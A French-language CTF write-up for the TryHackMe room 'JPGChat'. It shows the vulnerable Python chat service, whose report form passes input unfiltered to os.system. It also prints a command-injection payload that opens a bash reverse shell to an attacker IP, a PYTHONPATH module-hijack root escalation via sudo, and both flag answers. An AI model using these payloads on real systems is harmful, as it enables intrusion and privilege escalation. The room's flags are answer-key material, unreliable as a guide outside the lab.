# JPGChat #

## Task 1 Flags ##

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo sh -c "echo '10.10.69.76 jpgchat.thm' >> /etc/hosts"
[sudo] Mot de passe de tim : 

tim@kali:~/Bureau/tryhackme/write-up$ sudo nmap -A jpgchat.thm -p-
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-11 18:03 CEST
Nmap scan report for jpgchat.thm (10.10.69.76)
Host is up (0.055s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fe:cc:3e:20:3f:a2:f8:09:6f:2c:a3:af:fa:32:9c:94 (RSA)
|   256 e8:18:0c:ad:d0:63:5f:9d:bd:b7:84:b8:ab:7e:d1:97 (ECDSA)
|_  256 82:1d:6b:ab:2d:04:d5:0b:7a:9b:ee:f4:64:b5:7f:64 (ED25519)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     Welcome to JPChat
|     source code of this service can be found at our admin's github
|     MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
|_    REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.91%I=7%D=8/11%Time=6113F4FE%P=x86_64-pc-linux-gnu%r(NU
SF:LL,E2,"Welcome\x20to\x20JPChat\nthe\x20source\x20code\x20of\x20this\x20
SF:service\x20can\x20be\x20found\x20at\x20our\x20admin's\x20github\nMESSAG
SF:E\x20USAGE:\x20use\x20\[MESSAGE\]\x20to\x20message\x20the\x20\(currentl
SF:y\)\x20only\x20channel\nREPORT\x20USAGE:\x20use\x20\[REPORT\]\x20to\x20
SF:report\x20someone\x20to\x20the\x20admins\x20\(with\x20proof\)\n")%r(Gen
SF:ericLines,E2,"Welcome\x20to\x20JPChat\nthe\x20source\x20code\x20of\x20t
SF:his\x20service\x20can\x20be\x20found\x20at\x20our\x20admin's\x20github\
SF:nMESSAGE\x20USAGE:\x20use\x20\[MESSAGE\]\x20to\x20message\x20the\x20\(c
SF:urrently\)\x20only\x20channel\nREPORT\x20USAGE:\x20use\x20\[REPORT\]\x2
SF:0to\x20report\x20someone\x20to\x20the\x20admins\x20\(with\x20proof\)\n"
SF:);
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=8/11%OT=22%CT=1%CU=40706%PV=Y%DS=2%DC=T%G=Y%TM=6113F51
OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10D%TI=Z%II=I%TS=8)SEQ(SP=1
OS:04%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=8)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=I%
OS:TS=8)OPS(O1=M506ST11NW6%O2=M506ST11NW6%O3=M506NNT11NW6%O4=M506ST11NW6%O5
OS:=M506ST11NW6%O6=M506ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=
OS:68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M506NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%
OS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0
OS:%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S
OS:=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R
OS:=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N
OS:%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   31.89 ms 10.9.0.1
2   40.76 ms jpgchat.thm (10.10.69.76)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.27 seconds

```

Le scan nmap nous montre 2 service :
Le service SSH sur le port 22.    
Un service inconnu sur le port 3000.    

```bash
tim@kali:~/Bureau/tryhackme/write-up$ nc jpgchat.thm 3000
Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
```

On se connect sur le service avec netcat et on voit dans le message d'accueil un nom qui est JPGChat.   

On fait une recherche sur un moteur de recherche sur JPGChat et on trouve le code source.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ wget https://raw.githubusercontent.com/Mozzie-jpg/JPChat/main/jpchat.py -nv
2021-08-11 18:13:48 URL:https://raw.githubusercontent.com/Mozzie-jpg/JPChat/main/jpchat.py [892/892] -> "jpchat.py" [1]
tim@kali:~/Bureau/tryhackme/write-up$ cat jpchat.py 
#!/usr/bin/env python3

import os

print ('Welcome to JPChat')
print ('the source code of this service can be found at our admin\'s github')

def report_form():

	print ('this report will be read by Mozzie-jpg')
	your_name = input('your name:\n')
	report_text = input('your report:\n')
	os.system("bash -c 'echo %s > /opt/jpchat/logs/report.txt'" % your_name)
	os.system("bash -c 'echo %s >> /opt/jpchat/logs/report.txt'" % report_text)

def chatting_service():

	print ('MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel')
	print ('REPORT USAGE: use [REPORT] to report someone to the admins (with proof)')
	message = input('')

	if message == '[REPORT]':
		report_form()
	if message == '[MESSAGE]':
		print ('There are currently 0 other users logged in')
		while True:
			message2 = input('[MESSAGE]: ')
			if message2 == '[REPORT]':
				report_form()

chatting_service()
```

On regarde le code source.   
On remarque qu'il y a plusieurs failles de sécurités.   
On exécutes les commandes directement avec os.systemm.  
On mette la variable saisie à la fin de la commande.   
Dans la saisie il y a pas de filtrage de caractères interdit.   

On va exploiter la faille avec un reverse shell.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ nc -lvnp 1234
listening on [any] 1234 ...
```

On écoute le port pour avoir le reverse shell.    

```bash
tim@kali:~/Bureau/tryhackme/write-up$ nc jpgchat.thm 3000
Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
tim@kali:~/Bureau/tryhackme/write-up$ nc jpgchat.thm 3000
Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
[REPORT]
this report will be read by Mozzie-jpg
your name:
personne;bash -i >& /dev/tcp/10.9.228.66/1234 0>&1;
your report:
rien
personne
```

**Establish a foothold and get user.txt**

On exploit la faille.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.9.228.66] from (UNKNOWN) [10.10.69.76] 44744
bash: cannot set terminal process group (1421): Inappropriate ioctl for device
bash: no job control in this shell
wes@ubuntu-xenial:/$ id
id
uid=1001(wes) gid=1001(wes) groups=1001(wes)
wes@ubuntu-xenial:/$ cat /home/wes/user.txt
cat /home/wes/user.txt
JPC{487030410a543503cbb59ece16178318}
wes@ubuntu-xenial:/$ 

```

On obtient un shell.  
On lit le fichier user.txt.    

La réponse est : JPC{487030410a543503cbb59ece16178318}    

**Escalate your privileges to root and read root.txt**

```bash
wes@ubuntu-xenial:/$ sudo -l
sudo -l
Matching Defaults entries for wes on ubuntu-xenial:
    mail_badpass, env_keep+=PYTHONPATH

User wes may run the following commands on ubuntu-xenial:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/development/test_module.py
```

Dans la configuration sudo on peut exécuter un fichier test_module.py sans mot de passe.   

```bash
ls -al /opt/development/test_module.py
-rw-r--r-- 1 root root 93 Jan 15  2021 /opt/development/test_module.py

wes@ubuntu-xenial:/$ cat  /opt/development/test_module.py
cat  /opt/development/test_module.py
#!/usr/bin/env python3

from compare import *

print(compare.Str('hello', 'hello', 'hello'))

```

Ici on voit que l'on a pas les droits en écriture sur le fichier.   
On voit que python compare une chaîne avec un autre grace à un module du nom de compare.  
Il est possible d'usurper le chemin d'un module en modifiant la variable PYTHONPATH.

```bash
wes@ubuntu-xenial:/$ cd /tmp/	
cd /tmp/

wes@ubuntu-xenial:/tmp$ export PYTHONPATH=$PWD
export PYTHONPATH=$PWD

wes@ubuntu-xenial:/tmp$ cat > compare.py << EOF
cat > compare.py << EOF
> #!/usr/bin/env python3
#!/usr/bin/env python3
> import os
import os
> os.system("/bin/bash")
os.system("/bin/bash")
> EOF
EOF

wes@ubuntu-xenial:/tmp$ sudo /usr/bin/python3 /opt/development/test_module.py
sudo /usr/bin/python3 /opt/development/test_module.py
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
JPC{665b7f2e59cf44763e5a7f070b081b0a}

Also huge shoutout to Westar for the OSINT idea
i wouldn't have used it if it wasnt for him.
and also thank you to Wes and Optional for all the help while developing

You can find some of their work here:
https://github.com/WesVleuten
https://github.com/optionalCTF

```

On se met dans le répertoire \∕tmp on est sûre de pouvoir écrire dedant.   
On créer la variable PYTHONPATH avec comme valeur l'endroit où on va faire notre faux module.   
On créer notre faut module qui va exécuter un shell bash.   
On exécute le script avec sudo, notre faux module va être appelé.    
On obtient un shell avec les droits root.   
On lit le fichier root.txt.    

La réponse est : JPC{665b7f2e59cf44763e5a7f070b081b0a}    